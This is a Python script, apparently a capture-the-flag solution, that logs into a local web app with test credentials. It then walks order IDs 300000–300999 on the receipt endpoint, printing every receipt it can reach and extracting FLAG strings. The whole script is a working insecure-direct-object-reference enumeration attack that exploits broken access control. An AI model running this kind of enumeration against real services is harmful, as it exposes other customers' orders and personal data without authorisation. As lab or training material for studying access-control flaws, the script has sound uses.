import requests
import re

BASE_URL = "http://127.0.0.1:32781"

print("[*] Order enumeration 300000-300999")
print("="*80)

# Login
session = requests.Session()

print("\n[*] Logging in...")
r1 = session.post(f"{BASE_URL}/login", data={"username": "test"})
print(f"[+] Username: {r1.status_code}")

r2 = session.post(f"{BASE_URL}/login", data={"password": "test"})
print(f"[+] Password: {r2.status_code}")
print(f"[+] Session cookies: {dict(session.cookies)}")

# Enumerate
print("\n[*] Enumerating orders...")
valid = []
flags = []
counts = {}

for i in range(300000, 301000):
    try:
        r = session.get(f"{BASE_URL}/order/{i}/receipt", timeout=3)
        s = r.status_code
        counts[s] = counts.get(s, 0) + 1
        
        if s == 200:
            print(f"\n[+] FOUND: Order {i}")
            print(f"Response ({len(r.text)} bytes):\n{r.text}")
            valid.append(i)
            
            f = re.findall(r'FLAG\{[^}]+\}', r.text)
            if f:
                print(f"[!] FLAG: {f[0]}")
                flags.append((i, f[0]))
        
        if (i % 100) == 0:
            print(f"[.] Progress: {i}")
    except:
        pass

print("\n" + "="*80)
print("SUMMARY")
print("="*80)
print(f"Status codes: {counts}")
print(f"Valid orders: {valid}")
print(f"Flags: {flags}")

